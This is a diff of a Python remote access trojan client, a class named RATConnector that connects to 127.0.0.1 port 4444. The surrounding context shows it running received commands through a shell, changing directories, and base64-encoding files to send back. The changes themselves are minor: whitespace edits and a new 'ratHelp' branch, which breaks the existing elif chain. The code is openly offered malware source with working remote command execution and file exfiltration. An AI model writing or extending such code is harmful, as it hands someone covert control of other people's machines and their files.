@@ -46,7 +46,7 @@ class RATConnector:
             command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
         )
 
-    # Reading files with base 64 encryption for non UTF-8 compatability 
+    # Reading files with base 64 encryption for non UTF-8 compatability
     def readFile(self, path):
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
@@ -65,6 +65,8 @@ class RATConnector:
                 if command[0] == "exit":
                     self.connection.close()
                     sys.exit()
+                if command[0] == "ratHelp":
+                    commandResponse = ""
                 elif command[0] == "cd" and len(command) > 1:
                     os.chdir(command[1])
                     commandResponse = "[+] Changing active directory to " + command[1]
@@ -95,6 +97,7 @@ class RATConnector:
                     "[-] Error running command, check the syntax of the command."
                 )
             self.dataSend(commandResponse)
+
 
 ratClient = RATConnector("127.0.0.1", 4444)
 ratClient.run()
